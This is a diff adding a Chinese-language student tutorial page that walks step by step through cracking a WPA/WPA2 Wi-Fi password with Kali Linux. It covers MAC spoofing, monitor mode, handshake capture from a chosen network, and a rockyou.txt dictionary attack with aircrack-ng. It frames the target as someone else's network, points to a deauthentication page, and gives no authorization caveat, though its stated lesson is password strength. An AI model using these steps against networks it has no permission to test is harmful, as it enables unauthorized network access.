@@ -1,0 +1,149 @@
+<html>
+<head>
+<title>Kali安全滲透-破解密碼</title>
+<link rel=stylesheet type="text/css" href="kali.css">
+<canvas id="cw"></canvas>
+<script type="text/javascript" src="Mouse_F.js"></script>
+</head>
+<body>
+<div id=main>
+<header>
+	<h1> Kali 安全滲透</h1> 
+</header>
+<aside>
+	<nav>
+	<img src="kali-linux-logo-.jpg" width="170">
+	<ul>
+	<li style="font-size:14pt;"><a href="Kali-home.htm">首頁</a></li>
+	<li style="list-style:circle"><h6>學習操作</h6></li>
+	<li><a href="Kali-passwd.htm">破解密碼</a></li>
+	<li><a href="Kali-disconnection.htm">強制斷線</a></li>
+	<li><a href="Kali-evilPDF.htm">PDF監聽文件-1</a></li>
+	<li><a href="Kali-evilPDF_2.htm">PDF監聽文件-2</a></li>
+	<li><a href="Kali-evilWeb.htm">Web監聽網頁</a></li>
+	<li style="list-style:circle"><h6>前置作業</h6></li>
+	<li><a href="">製作開機USB</a></li>
+	<li><a href="Kali-Group.htm">社群介紹</a></li>
+	</ul>
+	</nav>
+</aside>
+<article>
+	<section class="consection">
+	<h3>破解密碼</h3>
+<fieldset>
+	<legend style="font-weight:bold; font-size:16pt">本次學習目標</legend>
+	如何破解別人Wi-Fi密碼(使用Aircrack-ng與密碼包破解WPA/WPA2密碼)。</br>
+	</br></br>
+	課程寓意：了解單數字、單只有小寫英文組成的密碼能在多短的時間被破解，提倡混和大小寫英文數字及特殊符號的重要性。</br>
+
+</fieldset>
+</section>
+	<p style="text-align:center;">*有標示顏色者為系統輸出</p>
+	<p>首先我們要先更變管理員權限</p>
+	<p class="code" style="color:#52008F	">01 ──(kali㉿kali)-[~]</p>
+	<p class="code">02 └─$ id kali </p>
+	<p style="text-indent: 4em">確認當前權限</p>
+	<p class="code">   uid=1000(kali) gid=1000(kali) groups=1000(kali), 4(adm), 20(dialout), 24(cdrom), 25(floppy), 27(sudo), 29(audio), 30(dip), 44(video), 46(plugdev), 109(netdev), 121(wireshark), 126(bluetooth), 138(scanner), 146(kaboxer)</p>
+	<p style="text-indent: 4em">前面的uid=1000，表示現在為普通用戶，需更改權限到root</p>
+	<p class="code" style="color:#52008F	">03 ──(kali㉿kali)-[~]</p>
+	<p class="code">04 └─$ sudo passwd root </p>
+	<p style="text-indent: 4em">設定密碼</p>
+	<p class="code">   New password: </p>
+	<p class="code">   Retype new password: </p>
+	<p class="code">   passwd: password updated successfully</p>
+	<p class="code" style="color:#52008F	">05 ──(kali㉿kali)-[~]</p>
+	<p class="code">06 └─$ su root </p>
+	<p class="code">   Password:</p>
+	<p class="code" style="color:#B80000">07 ┌──(root㉿kali)-[/home/kali]</p>
+	<p style="text-indent: 4em">看到第7行呈現root㉿kali即成功更變權限</p>
+	<img class="style_Pic" src="Pic/2-1.png" width="780" >
+	<hr/>
+	<p>查看網卡狀況</p>
+	<p class="code">08 └─# ifconfig -a</p>
+	<img class="style_Pic" src="Pic/2-2.png" width="70" >
+	<ul><li style="list-style:circle" >會看到類似上圖的輸出(涉及電腦情資不截全圖)</li></ul>
+	<hr/>
+	<p class="code" style="color:#B80000">09 ┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code" >10 # ifconfig wlan0 down</p>
+	<p class="code" style="color:#B80000">11 ┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">12 # macchanger --mac 00:11:22:33:44:55 wlan0 </p>
+	<img class="style_Pic" src="Pic/2-3.png" width="180" >
+	<ul><li style="list-style:circle" >會看到類似上圖的輸出(涉及電腦情資不截全圖)</li></ul>
+	<p style="text-indent: 4em">成功更變無線網卡位置</p>
+	<hr/>
+	<p class="code" style="color:#B80000">13 ┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">14 # airmon-ng check kill </p>
+	<p class="code" style="text-indent: 3em">Killing these processes:</p>
+	<p class="code" style="text-indent: 3em">PID Name</p>
+	<p class="code" style="text-indent: 3em">(編碼) wpa_supplicant</p>
+	<p class="code" style="color:#B80000">15┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">16 # airmon-ng start wlan0</p>
+	<img class="style_Pic" src="Pic/2-4.png" width="500" >
+	<p style="text-indent: 4em">成功更變無線網卡為wlan0mon</p>
+	<hr/>
+	<p class="code" style="color:#B80000">17┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">18 # ifconfig wlan0mon up</p>
+	<p class="code" style="color:#B80000">19┌──(root㉿kali)-[/home/kali] </p>
+	<p class="code">20 # airodump-ng wlan0mon</p>
+	<img class="style_Pic" src="Pic/2-5.png" width="500" >
+	<ul><li style="list-style:circle" >會看到類似上圖的輸出，顯示你附近的所有Wi-Fi</li></ul>
+	<p style="text-indent: 4em">覺得搜索差不多了，就按ctrl+c結束搜索(會看到"Quitting..."系統字符) </p>
+	<hr/>
+	<p>選擇一個你想破解的網路</p>
+	<p style="text-indent: 4em">這邊選擇No_Wi-Fi_KuKu_O </p>
+	<p style="text-indent: 4em">選擇好後，複製BSSID、CH(網路頻道)、ESSID ，接下來將針對這個網路進行探查</p>
+	<p class="code" style="color:#B80000">21┌──(root㉿kali)-[/home/kali] </p>
+	<p style="text-indent: 4em">下面語法:airodump-ng -c (CH頻道數字) -w (ESSID網路名稱) --bssid (BSSID網路位置碼)  (網卡名稱)</p>
+	<p class="code">22 └─# airodump-ng -c 6 -w No_Wi-Fi_KuKu_O --bssid AA:65:2B:1F:3E:43 wlan0mon</p>
+	<p style="text-indent: 4em">插曲:這邊我的BSSID與圖上的不同(沒有截到後面這一個BSSID的畫面) </p>
+	<img class="style_Pic" src="Pic/2-6.png" width="600" >
+	<ul><li style="list-style:circle" >輸入後會看到建立的.cap檔(我的叫"No_Wi-Fi_KuKu_O-03.cap") </li></ul>
+	<p style="text-indent: 4em">還有下圖的此網路的連線狀況(有幾個裝置連線)</p>
+	<p style="text-indent: 4em">在此要等候截取到握手包(WPA handshake)(可以先去下面取得密碼字典再回來)，如果等2、3分鐘一直截取不到，先轉至<a href="Kali-disconnection.htm">強制斷線</a>(從程式碼22行開始閱讀)，藉由打別人斷線後重新連線的過程得到握手包。</p>
+	<img class="style_Pic" src="Pic/2-7.png" width="600" >
+	<ul><li style="list-style:circle" >上圖為未成功得到握手包(WPA handshake) </li></ul>
+	<ul><li style="list-style:circle" >下圖為成功得到握手包(位在下圖的右上角處有顯示字樣 WPA handshake) </li></ul>
+	<img class="style_Pic" src="Pic/2-8.png" width="600" >
+	<p style="text-indent: 4em">得到握手包後按ctrl+c(會看到"Quitting..."系統字符)</p>
+	<hr/>
+	<p>要使用握手包進行密碼破解</p>
+	<h4><a href="">取得密碼字典</a>(這邊之後會再另開教程，下面教程之後會移走)</h4>
+	<p style="text-indent: 4em">Kali系統本身是有很多的密碼字典的，這邊要來告訴大家密碼筆數有10,303,727的密碼字典--rockyou.txt</p>
+	<p style="text-indent: 4em">(不要問我為什麼叫這個名子，我也不知道@@)</p>
+	<p style="text-indent: 4em">那它基本上在Flie System 中的usr</p>
+	<img class="style_Pic" src="Pic/10-1.png" width="400" >
+	<p style="text-indent: 4em">usr中的share</p>
+	<img class="style_Pic" src="Pic/10-2.png" width="400" >
+	<p style="text-indent: 4em">share中的wordlists</p>
+	<img class="style_Pic" src="Pic/10-3.png" width="400" >
+	<p style="text-indent: 4em">wordlists中的rockyou.txt.gz</p>
+	<img class="style_Pic" src="Pic/10-4.png" width="400" >
+	<p>這gz檔需要解壓縮，我們需要將他複製下來，儲存到我們的USB中再解壓縮，方便日後隨時需要使用</p>
+	<img class="style_Pic" src="Pic/10-5.png" width="400" >
+	<ul><li style="list-style:circle" >我自己的話是在USB中新增一個dict資料夾方便儲存密碼字典。(要記得複製路徑!)</li></ul>
+	<hr/>
+	<p>密碼字典準備好後(要記得複製路徑!)，就可以來破解密碼了</p>
+	<p class="code" style="color:#B80000">23┌──(root㉿kali)-[/home/kali] </p>
+	<p style="text-indent: 4em">aircrack-ng -w (字典的所在地~ex:/media/kali/"你的USB名稱+看你有沒有放置在資料夾中"/"檔案名子") (Wi-Fi網路的.cap檔)</p>
+	<p class="code">24 # aircrack-ng -w /media/kali/Hi/dict/rockyou.txt No_Wi-Fi_KuKu_O-03.cap</p>
+	<p>開始查找密碼</p>
+	<img class="style_Pic" src="Pic/2-9.png" width="500" >
+	<ul><li style="list-style:circle" >看到KEY FOUND!即為查找成功!"[]"內就是網路密碼</li></ul>
+	<p>如果密碼不是那麼簡單...電腦會開始很奮力地幫你搜尋結果</p>
+	<img class="style_Pic" src="Pic/2-10.png" width="500" >
+	<p style="text-indent: 4em">我自身的電腦以CPU100%在跑</p>
+	<img class="style_Pic" src="Pic/2-11.png" width="500" >
+	<p style="text-indent: 4em">已跑60%的密碼筆數(經過21分鐘了)</p>
+	<img class="style_Pic" src="Pic/2-12.png" width="500" >
+	<p style="text-indent: 4em">比對過rockyou裡所有的密碼筆數了，始終沒找到密碼的畫面KEY NOT FOUND(經過33分鐘)</p>
+	<hr/>
+	<p>本次學習結束</p>
+
+<!--中文註解設計09156202徐如怡-->
+
+	</section>
+</article>
+<footer>最後更新時間:2022/05/29 製作110-2自主學習社群Kali 教會我的那些事</footer>
+</div>
+</body>
+</html>
